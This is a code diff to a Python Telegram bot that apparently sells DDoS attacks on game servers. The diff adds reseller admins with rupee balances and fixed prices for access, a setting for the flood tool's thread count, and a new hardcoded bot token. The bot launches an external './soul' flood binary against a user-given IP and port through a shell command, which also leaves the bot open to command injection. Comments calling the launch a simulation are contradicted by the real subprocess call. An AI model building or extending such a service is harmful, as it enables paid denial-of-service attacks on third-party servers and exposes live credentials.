@@ -8,7 +8,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from pymongo import MongoClient
 
 # Bot token
-BOT_TOKEN = '7718352742:AAHscDSz2kCnPP8FXHmbQ24T2be3GJfwAv0'  # Replace with your bot token
+BOT_TOKEN = '7718352742:AAGUjv_NDp4sgnTnFQ62BPBgcb49wdKLrjY'  # Replace with your bot token
 
 # Admin ID
 ADMIN_ID = 1944182800
@@ -31,45 +31,101 @@ recent_attacks = {}
 # Cooldown period in seconds
 COOLDOWN_PERIOD = 180
 
-# Approve a user and save to MongoDB with dynamic duration
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
+    admin = collection.find_one({"user_id": update.effective_user.id})
+    
+    # Check if the user is the Super Admin or a normal admin
+    if update.effective_user.id != ADMIN_ID and (not admin or not admin.get("is_admin", False)):
         await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
         return
 
     try:
-        user_id = int(context.args[0])
-        duration_value = int(context.args[1])  # Value of time duration (e.g., 10, 5, etc.)
-        duration_type = context.args[2].lower()  # Type of duration: days, hours, minutes
+        user_id = int(context.args[0])  # ID of the user to approve
+        duration = context.args[1]  # Duration with a unit (e.g., 1m, 2h, 3d)
 
-        # Calculate expiration date based on duration type
-        if duration_type == "days":
-            expiration_date = datetime.now() + timedelta(days=duration_value)
-        elif duration_type == "hours":
-            expiration_date = datetime.now() + timedelta(hours=duration_value)
-        elif duration_type == "minutes":
+        # Parse the duration
+        duration_value = int(duration[:-1])  # Numeric part
+        duration_unit = duration[-1].lower()  # Unit part (m = minutes, h = hours, d = days)
+
+        # Calculate expiration time
+        if duration_unit == "m":  # Minutes
             expiration_date = datetime.now() + timedelta(minutes=duration_value)
+        elif duration_unit == "h":  # Hours
+            expiration_date = datetime.now() + timedelta(hours=duration_value)
+        elif duration_unit == "d":  # Days
+            expiration_date = datetime.now() + timedelta(days=duration_value)
         else:
-            raise ValueError("Invalid duration type. Use 'days', 'hours', or 'minutes'.")
+            await update.message.reply_text(
+                "❌ *Invalid duration format. Use `m` for minutes, `h` for hours, or `d` for days.*",
+                parse_mode="Markdown"
+            )
+            return
 
-        # Save user to MongoDB
+        # Super Admin logic: No balance deduction
+        if update.effective_user.id == ADMIN_ID:
+            collection.update_one(
+                {"user_id": user_id},
+                {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
+                upsert=True
+            )
+            await update.message.reply_text(
+                f"✅ *User {user_id} approved by Super Admin for {duration_value} "
+                f"{'minute' if duration_unit == 'm' else 'hour' if duration_unit == 'h' else 'day'}(s).* \n"
+                f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
+                parse_mode="Markdown"
+            )
+            return
+
+        # Balance deduction for normal admins
+        pricing = {
+            1: 75,  # 1 day = ₹75
+            3: 195,  # 3 days = ₹195
+            7: 395,  # 7 days = ₹395
+            30: 715  # 30 days = ₹715
+        }
+        price = pricing.get(duration_value) if duration_unit == "d" else None  # Pricing only applies for days
+
+        if price is None:
+            await update.message.reply_text(
+                "❌ *Normal admins can only approve for fixed durations: 1, 3, 7, 30 days.*",
+                parse_mode="Markdown"
+            )
+            return
+
+        admin_balance = admin.get("balance", 0)
+        if admin_balance < price:
+            await update.message.reply_text("❌ *Insufficient balance to approve this user.*", parse_mode="Markdown")
+            return
+
+        # Deduct balance for normal admin
         collection.update_one(
-            {"user_id": user_id},  # Search filter
-            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},  # Update or insert
+            {"user_id": update.effective_user.id},
+            {"$inc": {"balance": -price}}
+        )
+
+        # Approve the user
+        collection.update_one(
+            {"user_id": user_id},
+            {"$set": {"user_id": user_id, "expiration_date": expiration_date}},
             upsert=True
         )
 
         await update.message.reply_text(
-            f"✅ *User {user_id} approved for {duration_value} {duration_type}!*\n"
-            f"*Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
-            parse_mode="Markdown",
+            f"✅ *User {user_id} approved for {duration_value} days by Admin.*\n"
+            f"💳 *₹{price} deducted from your balance.*\n"
+            f"⏳ *Access expires on:* {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}",
+            parse_mode="Markdown"
         )
+
     except (IndexError, ValueError):
         await update.message.reply_text(
-            "❌ *Usage: /approve <user_id> <duration_value> <duration_type>*\n"
-            "Example: `/approve 123456789 5 hours` or `/approve 123456789 10 days`",
-            parse_mode="Markdown",
+            "❌ *Usage: /approve <user_id> <duration>*\n\n"
+            "Example durations:\n\n"
+            "1 Days = ₹75\n"
+            "3 Days = ₹195\n"
+            "7 Days = ₹395\n"
+            "30 Days = ₹715\n",
+            parse_mode="Markdown"
         )
         
 # Remove a user from MongoDB
@@ -110,6 +166,64 @@ def get_default_buttons():
         [InlineKeyboardButton("👻 CONTACT OWNER 👻", url="https://t.me/DAKUBhaiZz")]
     ]
     return InlineKeyboardMarkup(keyboard)
+    
+async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
+        return
+
+    try:
+        user_id = int(context.args[0])
+        balance = int(context.args[1])
+
+        # Add admin privileges and balance
+        collection.update_one(
+            {"user_id": user_id},
+            {"$set": {"is_admin": True, "balance": balance}},
+            upsert=True
+        )
+
+        await update.message.reply_text(
+            f"✅ *User {user_id} is now an admin with ₹{balance} balance.*", parse_mode="Markdown"
+        )
+    except (IndexError, ValueError):
+        await update.message.reply_text(
+            "❌ *Usage: /addadmin <user_id> <balance>*",
+            parse_mode="Markdown"
+        )
+        
+async def addbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
+        return
+
+    try:
+        user_id = int(context.args[0])
+        amount = int(context.args[1])
+
+        # Add balance to the admin's account
+        collection.update_one(
+            {"user_id": user_id},
+            {"$inc": {"balance": amount}}
+        )
+
+        await update.message.reply_text(
+            f"✅ *₹{amount} added to Admin {user_id}'s balance.*", parse_mode="Markdown"
+        )
+    except (IndexError, ValueError):
+        await update.message.reply_text(
+            "❌ *Usage: /addbalance <user_id> <amount>*",
+            parse_mode="Markdown"
+        )
+        
+async def adminbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    admin = collection.find_one({"user_id": update.effective_user.id})
+    if not admin or not admin.get("is_admin", False):
+        await update.message.reply_text("🚫 *You are not an admin.*", parse_mode="Markdown")
+        return
+
+    balance = admin.get("balance", 0)
+    await update.message.reply_text(f"💳 *Admin current balance is ₹{balance}.*", parse_mode="Markdown")
 
 # Command Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -132,7 +246,9 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "👤/owner - Information about the bot owner\n"
         "💌/myinfo - View your personal information\n"
         "-----------------------------------------------------------------------\n"
-        "👤/admincommand - Ye Tumhare Kisi Kaam Ka Nahi\n\n"
+        "💥 ONLY ADMIN COMMANDS\n\n"
+        "/approve - Approve Karne Ke Liye\n"
+        "/adminbalance - Admin Balance\n\n"
         "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
     )
     await update.message.reply_text(help_message, parse_mode='Markdown',
@@ -237,13 +353,34 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Start the attack process
     asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
     
-# Attack simulation function
-async def run_attack(ip, port, time_duration, update, user_id):
-    global current_attack_user, current_attack_end_time
+# Default thread value
+default_thread = "900"
+
+# Command to set thread dynamically
+async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
+        return
 
     try:
-        # Simulate the attack command
-        command = f"./soul {ip} {port} {time_duration} {900}"
+        global default_thread
+        new_thread = context.args[0]
+        if not new_thread.isdigit():
+            await update.message.reply_text("❌ *Invalid thread value. Please provide a numeric value.*", parse_mode="Markdown")
+            return
+
+        default_thread = new_thread  # Update the default thread value
+        await update.message.reply_text(f"✅ *Thread value updated to {default_thread}.*", parse_mode="Markdown")
+    except IndexError:
+        await update.message.reply_text("❌ *Usage: /setthread <thread_value>*", parse_mode="Markdown")
+
+# Modify the attack command to use the dynamic thread value
+async def run_attack(ip, port, time_duration, update, user_id):
+    global current_attack_user, current_attack_end_time, default_thread
+
+    try:
+        # Simulate the attack command with dynamic thread
+        command = f"./soul {ip} {port} {time_duration} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         # Wait for the specified duration
@@ -258,6 +395,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
             f"🌐 *IP:* {ip}\n"
             f"🎯 *PORT:* {port}\n"
             f"⏳ *DURATION:* {time_duration} seconds\n"
+            f"💻 *Thread Used:* {default_thread}\n"
             f"👤 *User ID:* {user_id}\n\n"
             "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
             parse_mode="Markdown",
@@ -322,6 +460,9 @@ async def admincommand(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/approve - Add user\n"
         "/remove - Remove user\n"
         "/set - Set Attack Time\n"
+        "/setthread - Thread Changing\n"
+        "/addbalance - Add Admin Balance\n"
+        "/addadmin - Add Reseller\n"
         "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz."
     )
     await update.message.reply_text(admin_message, parse_mode='Markdown')
@@ -342,6 +483,10 @@ def main():
     application.add_handler(CommandHandler("myinfo", myinfo))
     application.add_handler(CommandHandler("admincommand", admincommand))
     application.add_handler(CommandHandler("set", set_attack_limit))
+    application.add_handler(CommandHandler("setthread", set_thread))
+    application.add_handler(CommandHandler("addadmin", addadmin))
+    application.add_handler(CommandHandler("addbalance", addbalance))
+    application.add_handler(CommandHandler("adminbalance", adminbalance))
 
     # Start the bot
     application.run_polling()
